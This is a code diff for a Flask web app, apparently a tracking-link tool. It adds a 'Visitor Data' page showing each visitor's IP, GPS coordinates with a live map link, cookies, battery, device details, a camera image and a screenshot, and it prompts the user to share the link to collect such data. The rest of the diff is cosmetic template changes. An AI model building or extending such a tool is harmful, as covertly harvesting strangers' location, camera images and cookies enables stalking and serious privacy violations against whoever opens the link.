@@ -56,13 +56,13 @@ BASE_CSS = """
     .visit-card{background:#0d1520;padding:22px;border-radius:18px;margin:20px 0;border-left:6px solid #ff0044;font-size:1.2rem}
     .visit-card img{max-width:250px;height:auto;border-radius:12px;border:1px solid #334466;display:block;margin:12px 0}
     .visit-card .label{color:#6688aa;font-weight:bold;display:inline-block;width:150px}
-    .visit-card .value{color:#00ffcc;display:inline}
+    .visit-card .value{color:#00ffcc;display:inline;word-break:break-word}
     .visit-card .row{margin:10px 0}
     .del-btn{background:#ff004422;border:1px solid #ff0044;padding:12px 28px;border-radius:12px;cursor:pointer;color:#ffccbb;text-decoration:none;display:inline-block;margin-top:15px;font-size:1.2rem}
     h1{font-size:2.5rem;text-align:center;color:#ff0044}
     h3{font-size:1.8rem;color:#b0d4ff}
     .total-visits{font-size:1.5rem;color:#6688aa}
-    .map-link{color:#00ffcc;text-decoration:underline;font-size:1.2rem}
+    .map-link{color:#00ffcc;text-decoration:underline;font-size:1.2rem;margin-left:10px}
     .admin-table{width:100%;border-collapse:collapse;font-size:0.9rem;margin-top:20px}
     .admin-table th,.admin-table td{border:1px solid #334466;padding:10px;text-align:left;color:#c0d4ff;word-break:break-word}
     .admin-table th{background:#1a2332;color:#ff0044}
@@ -240,7 +240,7 @@ ADMIN_LOGIN_HTML = """
 </html>
 """
 
-# ===== Admin Panel (with Delete) =====
+# ===== Admin Panel =====
 ADMIN_PANEL_HTML = """
 <!DOCTYPE html>
 <html>
@@ -292,7 +292,7 @@ ADMIN_PANEL_HTML = """
 </html>
 """
 
-# ===== Admin View Single User =====
+# ===== Admin View Single User (same as user view but with delete) =====
 ADMIN_USER_HTML = """
 <!DOCTYPE html>
 <html>
@@ -314,11 +314,11 @@ ADMIN_USER_HTML = """
             {% for v in link.visits %}
             <tr>
                 <td>{{ loop.index }}</td>
-                <td>{{ v.ip }}</td>
-                <td>{{ v.city }}, {{ v.country }}</td>
-                <td>{{ v.gps or 'N/A' }}</td>
-                <td>{{ v.user_agent[:30] }}..</td>
-                <td>{{ v.time }}</td>
+                <td>{{ v.get('ip', 'N/A') }}</td>
+                <td>{{ v.get('city', 'Unknown') }}, {{ v.get('country', 'Unknown') }}</td>
+                <td>{{ v.get('gps', 'N/A') }}</td>
+                <td>{{ v.get('user_agent', 'N/A')[:30] }}..</td>
+                <td>{{ v.get('time', 'N/A') }}</td>
             </tr>
             {% endfor %}
         </table>
@@ -327,6 +327,63 @@ ADMIN_USER_HTML = """
     {% else %}
     <p style="color:#6688aa;">No links found.</p>
     {% endfor %}
+</div>
+</body>
+</html>
+"""
+
+# ===== User View Link (full data, same as admin) =====
+VIEW_LINK_HTML = """
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Visitor Data</title>""" + BASE_CSS + """
+</head>
+<body>
+<div class="container">
+    <a href="/dashboard" style="color:#6688aa;display:inline-block;margin-bottom:15px;font-size:1.3rem;">⬅️ Back to Dashboard</a>
+    <h1>📊 {{ link.name }}</h1>
+    <p class="total-visits">Total Visits: {{ link.visits|length }}</p>
+
+    {% if link.visits %}
+        {% for v in link.visits %}
+        <div class="visit-card">
+            <div class="row"><span class="label">IP Address:</span> <span class="value">{{ v.get('ip', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Location:</span> <span class="value">{{ v.get('city', 'Unknown') }}, {{ v.get('country', 'Unknown') }}</span></div>
+            <div class="row"><span class="label">GPS (Lat, Lng):</span> <span class="value">{{ v.get('gps', 'N/A') }}</span>
+                {% if v.get('gps') and v.get('gps') not in ['Permission denied', 'Failed', 'N/A'] %}
+                    <a href="https://www.google.com/maps?q={{ v.get('gps').split(',')[0].strip() }},{{ v.get('gps').split(',')[1].strip() }}" target="_blank" class="map-link">🗺️ Live Map</a>
+                {% endif %}
+            </div>
+            <div class="row"><span class="label">Browser / OS:</span> <span class="value">{{ v.get('user_agent', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Screen:</span> <span class="value">{{ v.get('screen', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Language:</span> <span class="value">{{ v.get('language', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Platform:</span> <span class="value">{{ v.get('platform', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Timezone:</span> <span class="value">{{ v.get('timezone', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Battery Level:</span> <span class="value">{{ v.get('battery', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Device Memory (GB):</span> <span class="value">{{ v.get('memory', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Cookies:</span> <span class="value">{{ v.get('cookies', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Referrer:</span> <span class="value">{{ v.get('referrer', 'N/A') }}</span></div>
+            <div class="row"><span class="label">Camera:</span>
+                {% if v.get('camera') and v.get('camera') != 'Failed' %}
+                    <img src="{{ v.get('camera') }}" />
+                {% else %}
+                    <span class="value">N/A</span>
+                {% endif %}
+            </div>
+            <div class="row"><span class="label">Screenshot:</span>
+                {% if v.get('screenshot') and v.get('screenshot') != 'Failed' %}
+                    <img src="{{ v.get('screenshot') }}" />
+                {% else %}
+                    <span class="value">N/A</span>
+                {% endif %}
+            </div>
+            <div class="row"><span class="label">Time:</span> <span class="value">{{ v.get('time', 'N/A') }}</span></div>
+            <a href="/delete_visit/{{ link.id }}/{{ loop.index0 }}" class="del-btn">🗑️ Delete this visit</a>
+        </div>
+        {% endfor %}
+    {% else %}
+        <p style="color:#6688aa;font-size:1.2rem;">No visits yet. Share your link to collect data.</p>
+    {% endif %}
 </div>
 </body>
 </html>
@@ -605,7 +662,7 @@ def logout():
     session.clear()
     return redirect(url_for('login'))
 
-# ===== Admin Routes (Hidden) =====
+# ===== Admin Routes =====
 @app.route('/admin-login', methods=['GET', 'POST'])
 def admin_login():
     if 'admin' in session:
